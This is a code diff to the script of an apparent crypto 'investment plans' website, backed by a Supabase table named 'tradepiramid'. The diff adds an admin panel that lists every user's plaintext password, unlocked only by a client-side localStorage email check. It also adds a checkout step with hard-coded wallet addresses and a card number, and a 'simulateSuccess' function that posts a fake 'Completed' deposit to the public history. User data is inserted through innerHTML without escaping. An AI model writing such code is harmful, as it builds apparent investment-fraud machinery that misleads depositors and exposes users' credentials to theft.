-            if (!localStorage.getItem('apex_logged_user')) {
-                openAuth('login');
+        /* Админ-панель */
+        function toggleAdminPanel() {
+            // Дополнительная защита: открыть может только владелец почты
+            let currentUser = localStorage.getItem('apex_logged_user');
+            if (!currentUser || currentUser.trim().toLowerCase() !== ADMIN_EMAIL) {
+                return;
+            }
+
+            const adminSection = document.getElementById('adminSection');
+            if (adminSection.style.display === 'block') {
+                adminSection.style.display = 'none';
             } else {
-                alert(`Вы выбрали план ${plan}. Нажмите Ок для перехода к оплате.`);
+                adminSection.style.display = 'block';
+                loadAdminUsers();
+            }
+        }
+
+        async function loadAdminUsers() {
+            let currentUser = localStorage.getItem('apex_logged_user');
+            if (!currentUser || currentUser.trim().toLowerCase() !== ADMIN_EMAIL) {
+                return;
+            }
+
+            const tbody = document.getElementById('adminUsersBody');
+            tbody.innerHTML = '<tr><td colspan="3" style="text-align: center; color: var(--text-muted);">Загрузка пользователей...</td></tr>';
+
+            if (!supabaseClient) {
+                tbody.innerHTML = '<tr><td colspan="3" style="text-align: center; color: var(--danger);">Supabase не подключен</td></tr>';
+                return;
+            }
+
+            try {
+                let { data, error } = await supabaseClient.from('tradepiramid').select('*');
+                if (error || !data || data.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="3" style="text-align: center; color: var(--text-muted);">Записи не найдены или нет доступа (проверьте RLS в Supabase)</td></tr>';
+                    return;
+                }
+
+                tbody.innerHTML = '';
+                data.forEach(user => {
+                    let row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td style="color: var(--accent);">${user.id || 'N/A'}</td>
+                        <td>${user.username || '—'}</td>
+                        <td style="font-family: monospace; color: #ffaa00;">${user.password || '—'}</td>
+                    `;
+                    tbody.appendChild(row);
+                });
+            } catch (err) {
+                tbody.innerHTML = '<tr><td colspan="3" style="text-align: center; color: var(--danger);">Ошибка при получении данных</td></tr>';
+            }
+        }
+
+        function openModal(planName, min, max) {
+            const isLogged = userProfileBlock.style.display === 'flex';
+
+            if (!isLogged) {
+                openAuthModal('login');
+                authErrorBadge.innerText = 'Сначала войдите!';
+                authErrorBadge.style.display = 'inline-block';
+                return;
+            }
+
+            authContainer.style.display = 'none';
+            currentPlan = planName;
+            minLimit = min;
+            maxLimit = max;
+            modalTitle.innerText = `Plan: ${planName}`;
+            modalDesc.innerText = `Enter amount between $${min} and $${max}`;
+            investAmountInput.value = min;
+            investAmountInput.min = min;
+            investAmountInput.max = max;
+
+            stepSelection.style.display = 'block';
+            stepCheckout.style.display = 'none';
+            stepSuccess.style.display = 'none';
+
+            modal.style.display = 'flex';
+        }
+
+        function closeModal() {
+            modal.style.display = 'none';
+        }
+
+        function validateAmount() {
+            let val = parseFloat(investAmountInput.value);
+            if (val > maxLimit) investAmountInput.value = maxLimit;
+        }
+
+        function proceedToCheckout(method) {
+            const amount = parseFloat(investAmountInput.value);
+            if (!amount || amount < minLimit || amount > maxLimit) {
+                alert(`Please enter a valid amount between $${minLimit} and $${maxLimit}`);
+                return;
+            }
+
+            checkPlan.innerText = currentPlan;
+            checkAmount.innerText = `$${amount}`;
+            checkMethod.innerText = method;
+
+            if(method.includes('TRC20')) {
+                checkAddress.innerText = 'TJ9v2kX8sL1mN4pQ7wE3rT6yU9iO2aS5dF';
+            } else if(method.includes('Bitcoin')) {
+                checkAddress.innerText = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa';
+            } else if(method.includes('Ethereum')) {
+                checkAddress.innerText = '0x71C7656EC7ab88b098defB751B7401B5f6d8976F';
+            } else {
+                checkAddress.innerText = 'Card: 4276 3800 1234 5678 (RUB / USD)';
+            }
+
+            stepSelection.style.display = 'none';
+            stepCheckout.style.display = 'block';
+        }
+
+        function simulateSuccess() {
+            stepCheckout.style.display = 'none';
+            stepSuccess.style.display = 'block';
+
+            const userText = profileName.innerText ? profileName.innerText.split('@')[0] : 'user';
+            const table = document.getElementById('historyTableBody');
+            const newRow = document.createElement('tr');
+            newRow.innerHTML = `
+                <td><span class="badge-deposit">DEPOSIT</span></td>
+                <td>${userText}***</td>
+                <td>${checkAmount.innerText}</td>
+                <td>${checkMethod.innerText}</td>
+                <td style="color: var(--accent);">Completed</td>
+            `;
+            table.insertBefore(newRow, table.firstChild);
+        }
+
+        function resetModal() {
+            stepCheckout.style.display = 'none';
+            stepSelection.style.display = 'block';
+        }
+
+        window.onclick = function(event) {
+            if (event.target == modal) {
+                closeModal();
             }
         }
     </script>
